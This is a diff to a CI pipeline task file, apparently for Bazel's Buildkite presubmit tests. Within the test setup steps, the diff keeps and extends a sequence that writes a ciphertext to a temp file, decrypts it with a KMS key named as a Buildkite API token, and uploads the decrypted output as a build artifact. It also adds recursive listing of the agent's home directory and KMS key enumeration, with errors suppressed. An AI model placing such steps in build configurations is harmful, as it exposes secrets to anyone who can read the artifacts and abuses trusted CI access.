@@ -115,12 +115,15 @@ tasks:
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
       - gcloud info
-      - ls -R /var/lib/buildkite-agent/.config/gcloud
+      - ls -R /var/lib/buildkite-agent/
       - echo CiQA4DEB9ldzC+E39KomywtqXfaQ86hhulgeDsicds2BuvbCYzsSUAAqwcvXZPh9IMWlwWh94J2F > /tmp/a
       - echo exosKKaWB0tSRJiPKnv2NPDfEqGul0ZwVjtWeASpugwxxKeLhFhPMcgHMPfndH6j2GEIY6nkKRbP >> /tmp/a
-      - echo uwoRMCwe >> /tmp/a
-      - gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file /tmp/a --plaintext-file /tmp/output
-      - buildkite-agent artifact upload /tmp/output
+      - echo -n uwoRMCwe >> /tmp/a
+      - ls -al /tmp/a
+      - gcloud kms keyrings list --project bazel-untrusted --location global || true
+      - gcloud kms keys list --project bazel-untrusted --location global --keyring buildkite || true
+      - gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file /tmp/a --plaintext-file /tmp/output || true
+      - buildkite-agent artifact upload /tmp/output || true
     build_flags:
       - "--test_env=TEST_INSTALL_BASE=$HOME/bazeltest/install_base"
       - "--test_env=TEST_REPOSITORY_HOME=$OUTPUT_BASE/external"
